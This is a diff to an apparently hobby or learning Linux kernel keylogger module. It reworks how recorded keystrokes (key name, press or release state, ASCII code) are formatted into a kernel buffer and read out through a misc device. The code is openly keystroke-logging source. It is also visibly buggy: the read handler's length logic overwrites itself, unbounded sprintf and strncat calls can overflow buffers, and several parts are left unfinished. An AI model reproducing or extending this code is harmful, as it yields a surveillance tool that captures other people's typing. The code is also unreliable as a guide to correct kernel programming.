@@ -20,7 +20,7 @@ static struct fsm scan_fsm = {
 
 LIST_HEAD(keystroke_list);
 
-static char	*keylogger_buffer = NULL;
+static char	*klg_buffer = NULL;
 
 /* Multiples fd sync and protect */
 /* multi buffer, multi flush ? */
@@ -28,37 +28,86 @@ static char	*keylogger_buffer = NULL;
 int	keylogger_open(struct inode *inode, struct file *filp)
 {
 	struct list_head 	*pos;
+	struct keystroke	*ks = NULL;
 	ssize_t			size = 0;
+	char			tmp[60];
+	int			retval = 0;
+	ssize_t			written;
 
 	list_for_each(pos, &keystroke_list) {
 		size++;
 	}
 
 	printk(KERN_INFO "nbr entries %lu\n", size);
-	keylogger_buffer = kmalloc(sizeof(struct keystroke) * size + 1, GFP_KERNEL);
+	/* change the way it's calculed */
+	/* new size + krealloc */
+	if (!(klg_buffer = kmalloc(60 * size + 1, GFP_KERNEL))) {
+		retval = -ENOMEM;
+		goto err;
+	}
 
-	return 0;
+	memset(tmp, 0, 60);
+	memset(klg_buffer, 0, 60 * size);
+	list_for_each_entry(ks, &keystroke_list, list) {
+		written = sprintf(tmp, "[time] %s %s %x\n", ks->name, (ks->state == 0) ? "PRESSED" :
+			"RELEASED", ks->ascii);
+		strncat(klg_buffer, tmp, written);	
+	}
+
+	/* init dev->size to length of klg_buffer */
+	
+
+err:
+	return retval;
 }
 
-int	keylogger_release(struct inode *inode, struct file *filp)
+int	keylogger_flush(struct file *filp, fl_owner_t id)
 {
-	kfree(keylogger_buffer);
+	printk(KERN_INFO "flushing klg_buffer\n");
+	kfree(klg_buffer);
 
 	return 0;
 }
+
+/* offset is shared between struct file ?*/
+/* seems not, cf LDD Chap3 "The file structure" */
 
 ssize_t keylogger_read(struct file *filp, char __user *buffer,
 				size_t length, loff_t *offset)
 {
 	ssize_t		retval = 0;
+	size_t		count = 0;
+	size_t		s;
 
+	/* read semaphore or spinlock */
+
+	/* size of buffer is dynamic */
+	s = strlen(klg_buffer);
+	if (*offset == s)
+		goto out;
+
+	if (*offset + length > s)
+		count = s - *offset;
+	if (length < s)
+		count = length;
+	else
+		count = s;
+
+	if ((copy_to_user(buffer, &klg_buffer[*offset], count))) {
+		retval = -EFAULT;
+		goto out;
+	}
+	*offset += count;
+	return count;
+	
+out :
 	return retval;
 }
 
 static struct file_operations keylogger_misc_fops = {
 	.open = keylogger_open,
 	.read = keylogger_read,
-	.release = keylogger_release,
+	.flush = keylogger_flush,
 };
 
 static struct miscdevice keylogger_misc = {
@@ -150,12 +199,11 @@ err:
 
 static void __exit keylogger_cleanup(void)
 {
-	struct keystroke *ks = NULL;
-	struct keystroke *n = NULL;
+	struct keystroke	*ks = NULL;
+	struct keystroke 	*n = NULL;
+	ssize_t			size = 0;	
 
 	misc_deregister(&keylogger_misc);
-	printk(KERN_INFO "keylogger module : deregister\n");
-
 /*	void driver_register(struct device_driver *drv) */
 
 	free_irq(KEYBOARD_IRQ, id);
@@ -164,9 +212,12 @@ static void __exit keylogger_cleanup(void)
 	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
 		list_del(&ks->list);	
 		kfree(ks);
+		size++;
 	}
 
 	/* free misc buffer */
+	printk(KERN_INFO "nbr of entries was %lu\n", size);
+	printk(KERN_INFO "keylogger module : deregister\n");
 }
 
 module_init(keylogger_init);
